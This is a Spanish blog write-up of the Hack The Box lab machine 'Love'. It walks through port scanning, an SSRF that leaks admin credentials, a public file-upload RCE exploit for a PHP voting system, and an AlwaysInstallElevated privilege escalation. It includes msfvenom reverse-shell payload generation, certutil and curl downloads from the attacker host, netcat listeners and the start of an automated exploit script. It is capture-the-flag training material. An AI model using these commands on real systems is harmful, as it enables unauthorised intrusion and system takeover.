@@ -1,0 +1,1073 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Love HTB Write-up - grafis Blog</title>
+<meta name="description" content="En este artículo comparto el write up de la máquina Love de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="grafis Blog">
+<meta property="og:title" content="Love HTB Write-up">
+<meta property="og:url" content="http://localhost:4000/Love/">
+
+
+  <meta property="og:description" content="En este artículo comparto el write up de la máquina Love de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/imagenes/Love/love_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-02-10T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/Love/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "grafis",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="grafis Blog Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Love HTB Write-up</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="grafis" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">grafis</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Estudiante de Ingeniería Civil en Informática y Telecomunicaciones
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/mirko-babic-velásquez-4979bb219" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/grafis0" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Love HTB Write-up">
+    <meta itemprop="description" content="En este artículo comparto el write up de la máquina Love de Hack The Box">
+    <meta itemprop="datePublished" content="February 10, 2023">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Love HTB Write-up
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-02-10T00:00:00-05:00">February 10, 2023 </time>&emsp;
+          
+          
+        </p>
+        <p align="center">
+<img src="/imagenes/Love/Love_banner.png" width="550" height="250" />
+</p>
+
+<h1 id="resumen"><a href="#header-2"></a>Resumen</h1>
+
+<p>Saludos, en esta oportunidad vamos a resolver la máquina de <strong>Hack The Box</strong> llamada <strong>Love</strong>, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:</p>
+
+<ul>
+  <li>Enumeración del sistema y descubrimiento de directorios y subdominios.</li>
+  <li>SSRF para encontrar información.</li>
+  <li>Abuso del CMS voting system (vulnerable).</li>
+  <li>Abuso del AlwaysInstallElevated utilizando archivo .msi.</li>
+  <li>Automatización de la intrusión mediante python.</li>
+</ul>
+
+<h2 id="reconocimiento-y-enumeración"><a href="#header-2"></a>Reconocimiento y Enumeración</h2>
+
+<p>En primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando <code class="language-plaintext highlighter-rouge">ping</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.239
+
+PING 10.10.10.239 (10.10.10.239) 56(84) bytes of data.
+64 bytes from 10.10.10.239: icmp_seq=1 ttl=127 time=145 ms
+</code></pre></div></div>
+<p>Se observa que existe una correcta conexión con la máquina.</p>
+
+<p>Para realizar un reconocimiento activo se utilizará la herramienta <code class="language-plaintext highlighter-rouge">nmap</code>, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro <code class="language-plaintext highlighter-rouge">-sS</code> el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p- -sS --open -min-rate 5000 10.10.10.239 -oG Port
+</code></pre></div></div>
+<p>Al finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE
+80/tcp    open  http
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+443/tcp   open  https
+445/tcp   open  microsoft-ds
+3306/tcp  open  mysql
+5000/tcp  open  upnp
+5040/tcp  open  unknown
+5985/tcp  open  wsman
+5986/tcp  open  wsmans
+7680/tcp  open  pando-pub
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+
+</code></pre></div></div>
+<p>Realizamos un escaneo de los servicios expuestos utilizando <code class="language-plaintext highlighter-rouge">nmap</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sCV -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 10.10.10.239
+
+</code></pre></div></div>
+
+<p>Como resultado del escaneo tenemos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+|_http-title: Voting System using PHP
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
+| Not valid before: 2021-01-18T14:00:16
+|_Not valid after:  2022-01-18T14:00:16
+| tls-alpn: 
+|_  http/1.1
+|_http-title: 403 Forbidden
+445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
+3306/tcp  open  mysql?
+| fingerprint-strings: 
+|   NotesRPC: 
+|_    Host '10.10.14.17' is not allowed to connect to this MariaDB server
+5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: 403 Forbidden
+5040/tcp  open  unknown
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| ssl-cert: Subject: commonName=LOVE
+| Subject Alternative Name: DNS:LOVE, DNS:Love
+| Not valid before: 2021-04-11T14:39:19
+|_Not valid after:  2024-04-10T14:39:19
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: 2023-02-11T21:36:15+00:00; +21m32s from scanner time.
+|_http-title: Not Found
+7680/tcp  open  pando-pub?
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3306-TCP:V=7.93%I=7%D=2/11%Time=63E804A5%P=x86_64-pc-linux-gnu%r(No
+SF:tesRPC,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.17'\x20is\x20not\x20a
+SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
+Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
+|   OS CPE: cpe:/o:microsoft:windows_10::-
+|   Computer name: Love
+|   NetBIOS computer name: LOVE\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2023-02-11T13:36:02-08:00
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: 2h21m32s, deviation: 4h00m01s, median: 21m31s
+| smb2-time: 
+|   date: 2023-02-11T21:36:00
+|_  start_date: N/A
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+</code></pre></div></div>
+
+<p>En primer lugar, se observa el puerto <code class="language-plaintext highlighter-rouge">445</code> abierto, el cual corresponde al servicio <code class="language-plaintext highlighter-rouge">smb</code>, por lo tanto, intentaremos realizar una enumeración del equipo y también si es posible de usuarios o recursos, para ello usaremos diferentes herramientas, la primera es <code class="language-plaintext highlighter-rouge">crackmapexec</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> crackmapexec smb 10.10.10.239
+
+SMB         10.10.10.239    445    LOVE             [*] Windows 10 Pro 19042 x64 (name:LOVE) (domain:Love) (signing:False) (SMBv1:True)
+</code></pre></div></div>
+
+<p>Intentamos listar recursos compartidos mediante <code class="language-plaintext highlighter-rouge">smbmap</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap -H 10.10.10.239
+
+[!] Authentication error on 10.10.10.239
+</code></pre></div></div>
+
+<p>Pero necesitamos credenciales para poder listar contenido.</p>
+
+<p>Obsevamos el puerto 80 abierto, por lo tanto, utilizando whatweb vamos a enumerar información del sistema:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb 10.10.10.239
+http://10.10.10.239 [200 OK] Apache[2.4.46], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27], IP[10.10.10.239], JQuery, OpenSSL[1.1.1j], PHP[7.3.27], PasswordField[password], Script, Title[Voting System using PHP], X-Powered-By[PHP/7.3.27], X-UA-Compatible[IE=edge]
+</code></pre></div></div>
+
+<p>Al entrar a la web vemos lo siguiente:</p>
+
+<p><img src="/imagenes/Love/love.png" alt="" /></p>
+
+<p>Vemos un panel donde se pide id y password, antes de intentar realizar algún tipo de injección terminaremos de enumerar el sistema, ahora realizamos fuzzing utilizando <code class="language-plaintext highlighter-rouge">wfuzz</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c --hc=404,403 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 http://10.10.10.239/FUZZ
+</code></pre></div></div>
+
+<p>Encontramos algo interesante:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>000000259:   301        9 L      30 W       337 Ch      "admin"
+</code></pre></div></div>
+
+<p>Vamos a la página a ver qué encontramos:</p>
+
+<p><img src="/imagenes/Love/love2.png" alt="" /></p>
+
+<p>Ahora es un panel de autenticación, con el mismo título de voting system, desconocemos si se trata de algún tipo de CMS, por lo tanto, buscamos por la web si existe y sí, corresponde a un CMS, por lo tanto, buscaremos vulnerabilidades asociadas:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit voting system
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Voting System 1.0 - Authentication Bypass (SQLI)                                                                                                                                 | php/webapps/49843.txt
+Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)                                                                                                        | php/webapps/49445.py
+Voting System 1.0 - Remote Code Execution (Unauthenticated)                                                                                                                      | php/webapps/49846.txt
+Voting System 1.0 - Time based SQLI  (Unauthenticated SQL injection)                                                                                                             | php/webapps/49817.txt
+</code></pre></div></div>
+
+<p>Obsevamos que hay diversas vulnerabilidades para este CMS. Sin embargo, seguiremos enumerando el sistema por ahora.</p>
+
+<p>Observamos que está el puerto 5000 abierto, por lo tanto, vamos a ingresar:</p>
+
+<p><img src="/imagenes/Love/love8.png" alt="" /></p>
+
+<p>Sin embargo, no tenemos permisos para ver este recurso.</p>
+
+<p>Vamos a seguir buscando información. En este caso intentaremos encontrar si es que existe algún subdominio, vemos que está el puerto 443 abierto, por lo tanto, nos conectamos con openssl por si encontramos información:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl s_client  -connect 10.10.10.239:443
+</code></pre></div></div>
+<p>Dentro de toda la información encontramos algo interesante:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 0 s:C = in, ST = m, L = norway, O = ValentineCorp, OU = love.htb, CN = staging.love.htb, emailAddress = roy@love.htb
+</code></pre></div></div>
+
+<p>Vamos a agregar <strong>love.htb</strong> y <strong>staging.love.htb</strong> al /etc/hosts:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1       localhost
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+10.10.10.239    love.htb staging.love.htb
+</code></pre></div></div>
+
+<p>Si ingresamos a <strong>staging.love.htb</strong> tenemos:</p>
+
+<p><img src="/imagenes/Love/love5.png" alt="" /></p>
+
+<p>Encontramos una sección llamada Demo, entramos en ella:</p>
+
+<p><img src="/imagenes/Love/love6.png" alt="" /></p>
+
+<p>Observamos que necesita una url, por lo tanto, abriremos un servidor http con python y pondremos nuestra dirección en la sección demo para probar si la página es funcional:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m http.server 80
+</code></pre></div></div>
+
+<p>Ingresamos nuestra ip:</p>
+
+<p><img src="/imagenes/Love/love7.png" alt="" /></p>
+
+<p>Si miramos nuestro servidor en python tenemos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.239 - - [11/Feb/2023 21:47:32] "GET / HTTP/1.1" 200 -
+</code></pre></div></div>
+
+<h2 id="explotación"><a href="#header-2"></a>Explotación</h2>
+
+<p>Vemos que efectivamente es funcional. Como por detrás está haciendo la consulta a una <strong>URL</strong> lo que podríamos hacer es verificar si se puede realizar un <strong>SSRF</strong>, en este caso probaremos si podemos enumerar información del lado del servidor que no podemos, para esto en vez de utilizar nuestra ip utilizaremos el localhost, especificamente en el puerto 5000, pues teniamos una página en la cual no teniamos permisos para revisar:</p>
+
+<p><img src="/imagenes/Love/love9.png" alt="" /></p>
+
+<p>Observamos que si se ha logrado obtener la información de la página desde el localhost. Observamos unas credenciales, en este caso de administrador, iremos a la página de administrador para intentar entrar:</p>
+
+<p><img src="/imagenes/Love/love10.png" alt="" /></p>
+
+<p>Estamos dentro del CMS como administradores. Si volvemos a mirar los resultados de <code class="language-plaintext highlighter-rouge">searchsploit</code> encontramos esto:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)                                                                                                        | php/webapps/49445.py
+</code></pre></div></div>
+<p>Tendríamos un RCE si estamos autenticados, y es el caso por lo tanto, vamos a ver que hace el código:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># --- Edit your settings here ----
+IP = "192.168.1.207" # Website's URL
+USERNAME = "potter" #Auth username
+PASSWORD = "password" # Auth Password
+REV_IP = "192.168.1.207" # Reverse shell IP
+REV_PORT = "8888" # Reverse port
+# --------------------------------
+</code></pre></div></div>
+
+<p>Vemos un área donde debemos ingresador los datos para ganar acceso al sistema. Si cambiamos los valores y ejecutamos el código no da un error. Si inspeccionamos el código nos damos cuenta que se realizan varias peticiones con estas url:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>INDEX_PAGE = f"http://{IP}/votesystem/admin/index.php"
+LOGIN_URL = f"http://{IP}/votesystem/admin/login.php"
+VOTE_URL = f"http://{IP}/votesystem/admin/voters_add.php"
+CALL_SHELL = f"http://{IP}/votesystem/images/shell.php"
+</code></pre></div></div>
+
+<p>sin embargo, si observamos nuestro index:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.239/admin/home.php
+</code></pre></div></div>
+<p>No existe la ruta votesystem, por lo tanto, lo cambiaremos en el script, si lo ejecutamos de nuevo:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python3 49445.py
+Start a NC listner on the port you choose above and run...
+Logged in
+Poc sent successfully
+</code></pre></div></div>
+
+<p>Si vamos a nuestro <code class="language-plaintext highlighter-rouge">netcat</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nvlp 8888
+listening on [any] 8888 ...
+connect to [10.10.14.17] from (UNKNOWN) [10.10.10.239] 50710
+b374k shell : connected
+
+Microsoft Windows [Version 10.0.19042.867]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\omrs\images&gt;whoami
+whoami
+love\phoeb
+</code></pre></div></div>
+
+<p>Hemos conseguido acceso al sistema (La explicación de por qué funciona este exploit será más adelante cuando programemos el autopwn).</p>
+
+<p>Buscamos la flag de usuario:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Phoebe\Desktop&gt;type user.txt
+type user.txt
+3f115dbec9b51e23c3608a87d
+</code></pre></div></div>
+
+<p>Bien, tenemos la flag, ahora debemos escalar privilegios.</p>
+
+<h2 id="escalada-de-privilegios"><a href="#header-2"></a>Escalada de privilegios</h2>
+
+<p>Para encontrar vías potenciales de escalada utilizaremos <code class="language-plaintext highlighter-rouge">winPEAS.exe</code>, mediante un servidor http con <strong>python</strong> compartimos el recurso y dentro de la máquina víctima ponemos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe -f -urlcache -split http://10.10.14.17/winPEASx64.exe winPEAS.exe
+</code></pre></div></div>
+
+<p>Al tenerlo en el equipo lo ejecutamos y buscamos cosas interesantes:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Checking AlwaysInstallElevated
+ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated
+    AlwaysInstallElevated set to 1 in HKLM!
+    AlwaysInstallElevated set to 1 in HKCU!
+</code></pre></div></div>
+
+<p>Observamos una posible forma de escalar privilegios, iremos a web de hacktricks para ver en que consiste.</p>
+
+<p>Básicamente, debemos realizar un payload .msi que haga una reverse shell con <code class="language-plaintext highlighter-rouge">msfvenom</code> y luego ejectuarlo con <strong>msiexec /quiet /qn /i</strong>.</p>
+
+<p>Por lo tanto, creamos el payload:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/shell_reverse_tcp  LHOST=10.10.14.17 LPORT=1235 --platform windows -a x64 -f msi -o reverse.msi
+</code></pre></div></div>
+
+<p>Luego, este archivo creado lo pasaremos a la máquina víctima:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl 10.10.14.17/reverse.msi -o reverse.msi
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  156k  100  156k    0     0   156k      0  0:00:01 --:--:--  0:00:01  191k
+</code></pre></div></div>
+
+<p>Con este archivo dentro de la máquina windows lo ejecutamos con <strong>msiexec /quiet /qn /i</strong> mientras tenemos netcat escuchando:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\xampp\htdocs\omrs\images&gt;msiexec /quiet /qn /i reverse.msi
+msiexec /quiet /qn /i reverse.msi
+</code></pre></div></div>
+
+<p>Si observamos nuestro <code class="language-plaintext highlighter-rouge">netcat</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap nc -nvlp 1235
+listening on [any] 1235 ...
+connect to [10.10.14.17] from (UNKNOWN) [10.10.10.239] 59296
+Microsoft Windows [Version 10.0.19042.867]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32&gt;whoami
+whoami
+nt authority\system
+</code></pre></div></div>
+
+<p>Bien, estamos dentro, ahora buscaremos la flag:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Administrator\Desktop&gt;type root.txt
+type root.txt
+799e26baf2559167d6b1257
+</code></pre></div></div>
+
+<p>¡Bien!</p>
+
+<p>Hemos ganado acceso como administrador.</p>
+
+<p>Sin embargo, ahora haremos un autopwn en python que nos permitirá ganar acceso al sistema.</p>
+
+<p>El código consiste en estos pasos:</p>
+<ul>
+  <li>injección sql para logearse en voting system.</li>
+  <li>Subir un archivo php malicioso que permite utilizar la variable cmd para injectar comandos.</li>
+  <li>Utilizar este archivo php para subir el netcat.exe a la máquina víctima.</li>
+  <li>Utilizar el mismo archivo php para realizar una conexión hacia nuestro equipo.</li>
+</ul>
+
+<p>En primer lugar, tenemos las librerías:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span><span class="n">sys</span><span class="p">,</span><span class="n">subprocess</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">system</span>
+</code></pre></div></div>
+
+<p>Luego, tenemos la función encargada del control + c y la función que aparece si no ingresan correctamente los datos:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">[!] saliendo...</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[!] Uso: python3 </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> "Tu IP" "Puerto para tu netcat"</span><span class="se">\n</span><span class="s">'</span> <span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Definimos las variables globales:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ipHost = sys.argv[1]
+ipPort = sys.argv[2]
+LoveIP = 'http://10.10.10.239'
+s = requests.Session()
+</code></pre></div></div>
+
+<p>Tenemos la siguiente función que se encarga de obtener el path del <code class="language-plaintext highlighter-rouge">nc.exe</code> y copiarlo en el directorio actual de trabajo:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">getNetcat</span><span class="p">():</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">check_output</span><span class="p">([</span><span class="s">"locate"</span><span class="p">,</span> <span class="s">"nc.exe"</span><span class="p">])</span>
+        <span class="n">result2</span> <span class="o">=</span> <span class="n">result</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">)</span>
+        <span class="n">path</span> <span class="o">=</span> <span class="n">result2</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s">'cp </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s"> .'</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"nc.exe not found"</span><span class="p">)</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>La siguiente función corresponde a la injección sql obtenida a través de <code class="language-plaintext highlighter-rouge">searchsploit</code>, la cual nos permite logearnos como administrador en el voting system:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">sqli</span><span class="p">():</span>
